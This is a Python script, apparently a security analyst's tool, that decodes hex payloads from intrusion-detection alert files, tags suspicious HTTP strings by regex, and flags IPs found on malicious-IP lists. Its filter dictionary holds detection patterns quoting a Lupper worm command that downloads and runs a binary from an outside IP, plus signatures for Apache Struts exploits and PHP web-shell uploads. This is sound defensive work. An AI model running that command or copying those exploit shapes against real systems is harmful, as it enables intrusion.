#!/usr/bin/python3
import enum
import pandas as pd
import struct
import socket
import requests
import urllib3
import json
import re
import csv
import chardet
import sys,time,os




def printProgressBar(i,max_,postText):
    n_bar = 20 #size of progress bar
    j = i/max_
    sys.stdout.write('\r')
    sys.stdout.write(f"[{'=' * int(n_bar * j):{n_bar}s}] {int(100 * j)}%  {postText}")
    sys.stdout.flush()

def Read_Csv(filepath, sep=','):
    f = open(filepath,'r')
    rdr = csv.reader(f,delimiter = sep)
    next(rdr)
    id_ = []
    srcip = []
    srcport = []
    dstip = []
    dstport = []
    directionType = []
    protocol = []
    detectName = []
    analyResult = []
    payload = []
    payload_ascii = []

    for line in rdr:
        print(line)
        id_.append(line[0])
        srcip.append(line[1])
        srcport.append(line[2])
        dstip.append(line[3])
        dstport.append(line[4])
        directionType.append(line[5])
        protocol.append(line[6])
        detectName.append(line[7])
        analyResult.append(line[8])
        payload.append(line[9])
        payload_ascii.append(line[10])
    
    data = pd.DataFrame({
        "_id": id_,
        "sourceIP": srcip,
        "sourcePort": srcport,
        "destinationIP": dstip,
        "destinationPort": dstport,
        "directionType": directionType,
        "protocol": protocol,
        "detectName": detectName,
        "analyResult": analyResult,
        "payload": payload,
        "payload_ascii": payload_ascii
    })

    print(data['payload'])
    return data

def Hex2Ascii(data): return b''.fromhex(data)
    
def Bytes2String(bytestring): #bytes to string 
    
    #string = bytestring.decode('utf-8','ignore')
    string = "" 
    for c in bytestring:
        string += chr(c)        
    string_mod = re.sub("[\r\n\t]","",string)
    return string_mod


def Int2Ip(ip):
    try:
        ip = int(ip)
    except:
        ip = 0 #Some data was NaN
    return socket.inet_ntoa(struct.pack('>i',ip)) # >: big endian, i: int

def DecodeIp(iplist):
    outputlist = []
    for ip in iplist:
        outputlist.append(Int2Ip(ip))
    return outputlist

def DeleteKeyZero(dict_):
    del_list = []
    for key,value in dict_.items():
        if sum(value) == 0:
            del_list.append(key)
    
    for key in del_list:
        del(dict_[key])

    return dict_

def Find_Tag(word,label):
    
    if label == 'User-Agent:[^\r\n]+':
        if word == 'User-agent: ViRobot Mobile Lite for Android':
            return 0
        for bad_word in ['bot','spy','pwn','github','paros']:
            if bad_word in word.lower():
                return 1
    
    patt = '[.]\S+[.]?\w*'
    if label == 'filename=[^\r\n]+':
        p = re.compile(patt,re.I)
        found = p.findall(word)
        #print(word)
        #input()
        if found:
            for fnd in found:
                if len(fnd) >= 6:
                    for bad_word in ['php','jsp','asp']:
                        if bad_word in fnd.lower():
                            return 1
                else:
                    for bad_word in ['php','jsp','asp']:
                        if bad_word in fnd.lower():
                            return 1

    if label in ['POST[^\r\n]+','GET[^\r\n]+']:
        if '/xmlrpc.php' in word.lower():
            return 1
        elif 'fckeditor' and 'editor' and 'filemanager' in word.lower():
            return 1
    

    return 0


def FilteringPayload(payloadlist,filterlist):
    payload_to_ascii = []
    tagging = []

    _filterlists = ['User-Agent:[^\r\n]+','POST[^\r\n]+','GET[^\r\n]+','filename=[^\r\n]+']
    for payload in payloadlist:
        tag = []

        try:
            ascii_payload = Hex2Ascii(payload)
        except:
            ascii_payload = b"Error"
        payload_to_ascii.append(ascii_payload)
        
        cnt = 0
        for ft in filterlist:
            
            p = re.compile(bytes(ft,'utf-8'),re.I)
            if p.search(ascii_payload,re.I) is not None:
                filtered = p.findall(ascii_payload,re.I)
                for s in filtered:
                    if ft in _filterlists:
                        if Find_Tag(Bytes2String(s),_filterlists):
                            tag.append(Bytes2String(s))
                    else:
                        tag.append(Bytes2String(s))
            
            cnt += 1
        
        tag = list(set(tag))

        tagged = tag


        tagging.append(tagged)
   
    return payload_to_ascii, tagging

def CheckIP(IPs, malIPdict):
    result = []
    
    for ip in IPs:
        if ip in malIPdict:
            result.append(malIPdict[ip])
            #print(ip,malIPdict[Int2Ip(ip)])
        else:
            result.append(0)
    
    return result 


def SaveFile(dataframe,filename):
    savepath = '/mnt/c/Users/master/TASK/tagging_result'
    result_file=filename[:-4] + '_filetered.csv'
    try:
        dataframe.to_csv(savepath+'/'+result_file,index=None,escapechar='\r')
    except PermissionError:
        print("Please close file!")
        current_time = time.strftime('%H_%M_%S', time.localtime(time.time()))
        new = result_file[:-4] + f"_new[{current_time}].csv"
        dataframe.to_csv(savepath+'/'+new,index=None,escapechar='\r')

def LoadFile(f):
    try:
        if f[-3:] == 'txt':
            data = pd.read_csv(f,sep='\t',encoding = 'utf-8')
        elif f[-3:] == 'csv':
            data = pd.read_csv(f,sep=',',encoding = 'utf-8')
    except:
        try:
            if f[-3:] == 'txt':
                data = pd.read_csv(f,sep='\t',encoding = 'cp949')
            elif f[-3:] == 'csv':
                data = pd.read_csv(f,sep=',',encoding = 'cp949')
        except:
            try:
                data = Read_Csv(f)
            except:
                data = Read_Csv(f,'\t')
    return data


filter_label = ['User-Agent','POST string', 'GET string', 'filename']

filter_list = ['User-Agent:[^\r\n]+','POST[^\r\n]+','GET[^\r\n]+','filename=[^\r\n]+']

filterlist_dict = {
    '0009_(CTEST)Attack-IP-Susp(J2).18111601@.txt': [['JSESSIONID'],['JSESSIONID=[^\r\n]+']], 
    '0145_(CTEST)Relay-IP-01-11O-port().16051115@.txt': [['Server exposure','HTTP Method exposure','X-Powered-By exposure'],['server:[^\r\n]+','Allow:[^\r\n]+','X-Powered-By:[^\r\n]+']], 
    '0174_(CTEST)Relay-IP-01-11O-port().16082102@.txt': [['Torrent'],['Torrent']], 
    '0183_(CTEST)Relay-IP-01-11O-port().16092005@.txt': [], #['ETag'],['ETag:[^\r\n]+'] 
    '0188_(CTEST)Relay-IP-01-11O-port().16100301@.txt': [], 
    '0200_(CTEST)Relay-IP-01-11O-port().16111502@.txt': [], 
    '0250_(CTEST)Relay-IP-C3(Mars).18120314@.txt': [], 
    '0332_(CTEST)Relay-IP-Susp(C1).18111605@.txt': [], 
    '0339_(CTEST)Relay-IP-Susp(C1).18112805@.txt': [['Malicious URL: *.lunrac.com'],['.*[.]lunrac[.]com']], 
    '0355_(CTEST)Relay-IP-port().16122002@.txt': [], 
    '0361_(CTEST)Relay-IP-port().17012406@.txt': [['X-Pingback: xmlrpc.php'],['X-Pingback:[^\r\n]+xmlrpc[].]php']], 
    '0379_(CTEST)Relay-IP-port().17070203@.txt': [], 
    '0444_(CTEST)Relay-IP-port().18050308@.txt': [], 
    '0483_(CTEST)Relay-IP-port().18100109@.txt': [], 
    '0486_(CTEST)Relay-IP-port().18100112@.txt': [['PHPSESSID'],['PHPSESSID=[^\r\n]+']], 
    '0487_(CTEST)Relay-IP-port().18100113@.txt': [], 
    '0538_(CTEST)WEB-PAT-01-11O-Script(iframe).15042207@.txt': [['malicious ad'],['secure[.]bidverdrs[.]com']], 
    '0544_(TEST)TEST-PAT-00-00-Open(ConfirmInsert.do).16102003@.txt': [], 
    '0547_00-IP-01-00-SAS(FR).15122804@.txt': [], 
    '0548_00-IP-01-00-py_starjoint(1024).10061601@.txt': [], 
    '0587_Attack-IP-01-11O-Suspicious(Web).16051205@.csv': [['Proxy','Cookie','ID-PW'],['Proxy-Connection: keep-alive','Cookie:[^\r\n]','user.*password=']], 
    '0588_Attack-IP-01-11O-Suspicious(Web).16051207@.csv': [], 
    '0706_Attack-IP-Suspicious().18031301@.txt': [], 
    '0707_Attack-IP-Suspicious().18040406@.txt': [], 
    '0710_Attack-IP-Suspicious().18041206@.csv': [], 
    '0717_Attack-IP-Suspicious().18042604@.txt': [], 
    '0776_Attack-IP-Suspicious(107.191).17011013@.txt': [], 
    '0821_Attack-IP-Suspicious(DOM).16111003@.csv': [], 
    '0827_Attack-IP-Suspicious(DOM).16122704@.txt': [], 
    '0835_Attack-IP-Suspicious(DOM).17083103@.txt': [], 
    '0852_Attack-IP-Suspicious(DOM).18050101@.txt': [], 
    '0886_Attack-IP-Suspicious(DOM-PCI).17071401@.txt': [], 
    '0929_Attack-IP-Suspicious(DOM-TorGuad).16122006@.csv': [], 
    '0937_Attack-IP-Suspicious(Fenji-BACITE).16121622@.txt': [], 
    '0941_Attack-IP-Suspicious(Hurricane-64).17020905@.txt': [], 
    '0943_Attack-IP-Suspicious(Hurricane-74).17020906@.txt': [], 
    '1007_Attack-IP-Suspicious(NewY-BACITE).16121624@.csv': [], 
    '1019_Attack-IP-Suspicious(PPTP-VN).16120802@.txt': [], 
    '1027_Attack-IP-Suspicious(SGBISTA).17022419@.txt': [], 
    '1039_Attack-IP-Suspicious(Sing-BACITE).16121625@.txt': [], 
    '1041_Attack-IP-Suspicious(Toky-BACITE).16121621@.txt': [], 
    '1047_Attack-IP-Suspicious(US).17051518@.txt': [], 
    '1048_Attack-IP-Suspicious(US).17051519@.txt': [], 
    '1051_Attack-IP-Suspicious(US).17062701@.txt': [], 
    '1052_Attack-IP-Suspicious(US).17081107@.csv': [], 
    '1096_Attack-IP-Suspicious(request.php).17030606@.txt': [], 
    '1097_Attack-IP-Suspicious(taepye).17102305@.txt': [], 
    '1161_Exploit Suspected PHP Injection Attack (cmd=).txt': [], 
    '1166_Info-standard-RDP().18052901@.txt': [['CVE-2017-5638'],["Content-Type: [%][^\r\n]+"]], 
    '1364_Mail-PAT-Suspicious(DOM).18073102@.csv': [], 
    '1486_Mail-PAT-sender(FAKE-ID).18022502@.txt': [], 
    '1495_Malware-IP-01-cloud-api(yandex).18072908@.txt': [], 
    '1578_Malware-PAT-02-00-Mirage(POST).15112304@.txt': [], 
    '1584_Malware-PAT-ActiveX(G1).18112022@.txt': [], 
    '1973_RAT-PAT-02-00-dev(trojan-cn-gh0st).09062302@.txt': [], 
    '2030_Relay-IP-Port(DOM).18071008@.txt': [], 
    '2093_Relay-IP-Suspicious(Web).17042110@.txt': [], 
    '2105_Relay-IP-port().18071301@.txt': [], 
    '2136_Relay-IP-port(BACITE).16121506@.txt': [], 
    '2137_Relay-IP-port(BACITE).16121507@.csv': [],
    '2138_Relay-IP-port(BACITE).16121511@.txt': [], 
    '2145_Relay-IP-port(BACITE).16121518@.txt': [], 
    '2151_Relay-IP-port(BACITE).16121524@.txt': [], 
    '2169_Relay-IP-port(Nord).18082103@.txt': [], 
    '2204_WEB-PAT-00-00-file(upload).05102701@.csv': [['Mister Spy','<?php ... >'],['Mister\sSpy','<[?]php[\s\S]{1,2}.*[?]?>?']], 
    '2205_WEB-PAT-00-00-fileupload(fckeditor).10111102@.txt': [['Fckeditor','Fckeditor'],['fck[/]?editor/[editor/]?/filemanager[^\r\n]+','editor/filemanager[^\r\n]+']], 
    '2258_Web-PAT-Apache_Struts(CVE17-9805).17090812@.csv': [["CVE-2017-9805","CVE-2017-9805","CVE-2017-9805"],['<next class=["]java[.]lang[.]ProcessBuilder["]>\s*<command>[\s\S]*</command[>]?','<next class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">\s*<com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\s*<default>\s*<__name>Pwnr</__name>','<next class=["]java[.]lang[.]ProcessBuilder["]>\s*<command>\s*<string>[\s\S]*</string>']], 
    '2273_XML-RPC for PHP Remote Code Injection.txt': [['Lupper Worm'],['cd [/]tmp;wget 24[.]224[.]174[.]18/listen;chmod [+]x listen;[.][/]listen']], 
    '2276_[KISTI_140307_01] User-Agent(paros).txt': []
    }

def summaldict():
    #malIP = pd.read_csv('maliciousIP(malwares_dot_com).csv',sep=',',encoding = 'utf-8')
    malIP = pd.read_csv('updatemalwares.csv',sep=',',encoding = 'utf-8')
    #malIP2 = pd.read_csv('Mdict.csv',sep=',',encoding = 'utf-8')
    malIPdict = dict(zip(malIP['IP'].tolist(),malIP['Detected_Url_Total'].tolist()))
    #malIPdict2 = dict(zip(malIP2['IP'].tolist(),malIP2['Detected_Url_Total'].tolist()))
    #malIPdict.update(malIPdict2)
    return malIPdict

def scoreip():
    ipscore = pd.read_csv('score.csv',sep = ',',encoding='utf-8')
    #ipscore.to_csv('score1.csv',sep=',',encoding='utf-8',index=None)
    scoredict = dict(zip(ipscore['IP'].tolist(),ipscore['SCORE'].tolist()))
    return scoredict

def main(filter_label, filter_list):
    dirpath = '/mnt/c/Users/master/Desktop/jupyter/z/tagging/tagging_data_modified'
    

    file_list = os.listdir(dirpath)

    malIPdict = summaldict()
    #save_mal =pd.DataFrame(list(malIPdict.items()),columns=['IP','Detected_Url_Total'])
    #save_mal.to_csv('updatemalwares.csv',sep=',',index=None)
    ipscore = scoreip()
    #print(ipscore)
    
    for file_ in file_list:
        try:
            filter_label += filterlist_dict[file_][0]
            filter_list += filterlist_dict[file_][1]
        except:
            pass
    
    for i, file_ in enumerate(file_list, start=1):

        f = '/'.join([dirpath,file_])
        data = LoadFile(f)
        srcip = DecodeIp(data['sourceIP'])
        dstip = DecodeIp(data['destinationIP'])

        payload_to_ascii, tagging = FilteringPayload(data['payload'],filter_list)
        checksrcip = CheckIP(srcip,malIPdict)
        checkdstip = CheckIP(dstip,malIPdict)
        srcipscore = CheckIP(srcip,ipscore)
        dstipscore = CheckIP(dstip,ipscore)

        for j,tag in enumerate(tagging):
            if checksrcip[j] != 0:
                tagging[j].append(f'{srcip[j]}')
            if checkdstip[j] != 0:
                tagging[j].append(f'{dstip[j]}')
            if srcipscore[j] != 0:
                tagging[j].append(f'{srcip[j]}')
            if dstipscore[j] != 0:
                tagging[j].append(f'{dstip[j]}')

        df2 = pd.DataFrame({
#            "_id": data['_id'],
            "sourceIP": srcip,
            "sourcePort": data['sourcePort'],
            "destinationIP": dstip,
            "destinationPort": data['destinationPort'],
            "directionType": data['directionType'],
            "protocol": data['protocol'],
            "analyResult": data['analyResult'],
            "payload": data['payload'],
            "payload_ascii": payload_to_ascii
        })
        #for i,ft in enumerate(filter_list):
        #    df2[filter_label[i]] = stats[filter_label[i]]
        for k,tag in enumerate(tagging):
            tagging[k] = '{string: '+', '.join(tagging[k])+'}'

        df2['tagging'] = tagging
        SaveFile(df2,file_)
        printProgressBar(i, len(file_list), "Filtering file!")
    print("\n")



main(filter_label, filter_list)
#ipscore = scoreip()

'2204_WEB-PAT-00-00-file(upload).05102701@'
